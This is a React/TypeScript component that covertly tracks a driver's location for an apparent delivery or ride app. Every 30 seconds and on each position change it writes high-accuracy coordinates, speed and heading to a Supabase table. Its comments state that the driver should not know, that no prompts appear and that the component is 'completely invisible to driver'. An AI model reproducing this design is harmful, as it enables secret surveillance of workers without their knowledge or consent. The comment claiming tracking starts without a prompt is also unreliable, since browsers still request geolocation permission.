'use client';

import { useEffect, useCallback, useRef } from 'react';
import { supabase } from '@/lib/supabase';
import { useSupabase } from '@/components/supabase-provider';

interface GeolocationPosition {
  latitude: number;
  longitude: number;
  accuracy: number;
  speed: number | null;
  heading: number | null;
}

export function SilentLocationTracker() {
  const { user } = useSupabase();
  const intervalRef = useRef<NodeJS.Timeout | null>(null);
  const watchIdRef = useRef<number | null>(null);

  const saveLocationToDatabase = useCallback(async (pos: GeolocationPosition) => {
    if (!user) return;

    try {
      await supabase
        .from('driver_locations')
        .upsert({
          driver_id: user.id,
          driver_name: user.name || 'Unknown',
          latitude: pos.latitude,
          longitude: pos.longitude,
          accuracy: pos.accuracy,
          speed: pos.speed,
          heading: pos.heading,
          is_online: true,
          last_updated: new Date().toISOString(),
        }, {
          onConflict: 'driver_id'
        });
    } catch (err) {
      // Silent fail - driver should not know tracking failed
      console.debug('Location tracking error:', err);
    }
  }, [user]);

  const handlePositionUpdate = useCallback((position: GeolocationPosition) => {
    saveLocationToDatabase(position);
  }, [saveLocationToDatabase]);

  useEffect(() => {
    if (!user || typeof navigator === 'undefined' || !navigator.geolocation) {
      return;
    }

    // Try to get permission silently - don't show any prompts
    const startSilentTracking = () => {
      // Use watchPosition for real-time updates
      watchIdRef.current = navigator.geolocation.watchPosition(
        (pos) => {
          handlePositionUpdate({
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            speed: pos.coords.speed,
            heading: pos.coords.heading,
          });
        },
        (err) => {
          // Silent error - driver shouldn't know tracking failed
          console.debug('Geolocation error:', err);
        },
        {
          enableHighAccuracy: true,
          timeout: 30000,
          maximumAge: 10000,
        }
      );

      // Also update every 30 seconds as fallback
      intervalRef.current = setInterval(() => {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            handlePositionUpdate({
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
              speed: pos.coords.speed,
              heading: pos.coords.heading,
            });
          },
          () => {
            // Silent fail
          },
          {
            enableHighAccuracy: true,
            timeout: 30000,
            maximumAge: 10000,
          }
        );
      }, 30000);
    };

    // Start tracking immediately without any prompt
    startSilentTracking();

    return () => {
      if (watchIdRef.current !== null) {
        navigator.geolocation.clearWatch(watchIdRef.current);
      }
      if (intervalRef.current) {
        clearInterval(intervalRef.current);
      }
      
      // Mark as offline when unmounting
      if (user) {
        supabase
          .from('driver_locations')
          .update({ is_online: false })
          .eq('driver_id', user.id)
          .then(() => {});
      }
    };
  }, [user, handlePositionUpdate]);

  // No UI rendered - completely invisible to driver
  return null;
}
